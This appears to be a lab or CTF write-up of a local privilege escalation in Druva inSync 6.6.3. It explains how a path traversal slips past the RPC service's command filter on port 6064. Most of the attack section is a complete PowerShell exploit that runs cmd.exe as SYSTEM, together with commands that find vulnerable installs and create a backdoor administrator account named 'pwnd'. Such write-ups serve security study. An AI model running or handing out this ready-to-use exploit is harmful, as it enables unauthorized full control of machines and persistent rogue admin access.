# Druva inSync 6.6.3

- **Druva inSync :** is an enterprise backup and data‑protection application that runs on endpoints to securely back up, sync, and restore user files to the Druva cloud or corporate storage.
- **RPC (Remote Procedure Call):** is a communication method that allows a program to execute a function or command on another process or computer over the network as if it were local, and receive the result back.

### Objective:

Gain a user account with high privileges.

### Vulnerability Overview :

- Druva inSync was vulnerable because its service exposed an **RPC interface on port 6064**that executed commands with**SYSTEM privileges**without proper validation.
- A patch introduced in version **6.5.0** attempted to restrict execution by allowing only commands that started with the path:  **C:\ProgramData\Druva\inSync4\**  where legitimate binaries were supposed to be located.

However, this control could be bypassed using a**path traversal attack** , for example:

**C:\ProgramData\Druva\inSync4......\Windows\System32\cmd.exe**

which resolves to the real path  **C:\Windows\System32\cmd.exe**

.As a result, even version **6.6.3** remained vulnerable, allowing local users to execute arbitrary commands as SYSTEM.

### Required condition:

- vulnerable version of Druva inSync (6.5.0 or 6.6.3)
- the original payload :

```jsx
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

```

### Enumeration / Discovery:

- list the services with there versions to discover unpatched ones  : 

`wmic product get name,version,vendor`

### Exploitation Steps :

1. Change the payload with the command that we want by 
`net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`

instead of only :  `"net user pwnd /add"`

1. Execute the payload in powershell ISE:

![image.png](Druva%20inSync%206%206%203/image.png)

we can verify by executing this command :  `net user <USERNAME>`

![image.png](Druva%20inSync%206%206%203/image%201.png)

1. Run cmd as Administrator
- we connect to it ising the credentials we did used before :

![image.png](Druva%20inSync%206%206%203/image%202.png)

and Here We Go : 

![image.png](Druva%20inSync%206%206%203/image%203.png)
